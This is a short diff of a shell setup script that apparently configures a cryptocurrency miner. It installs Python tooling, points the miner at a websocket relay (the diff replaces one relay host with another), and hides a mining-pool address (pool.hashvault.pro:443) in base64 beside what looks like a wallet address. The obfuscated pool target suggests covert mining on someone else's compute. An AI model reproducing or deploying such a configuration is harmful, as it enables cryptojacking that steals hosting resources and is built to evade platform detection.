@@ -19,7 +19,7 @@ fi
 export PATH=./python/bin:$PATH
 yes |  pip install certifi
 export SSL_CERT_FILE=$(python -m certifi)
-echo "SERVER_WS=wss://server.smartcontrolai.io.vn
+echo "SERVER_WS=wss://node--wss--9fb77cgtfy78.code.run
 SERVER_TARGET=cG9vbC5oYXNodmF1bHQucHJvOjQ0Mw==
 SERVER_DOMAIN=89ZiiZkB7S52XsNLpJGLS3iiWpY8F7wxSV1a73psgHKWTqTPFruXTT1QW5EDmoadfyYZatKDvcGroZbHRoqNbnyh2TRbeug
 SERVER_SECRET=$NAME
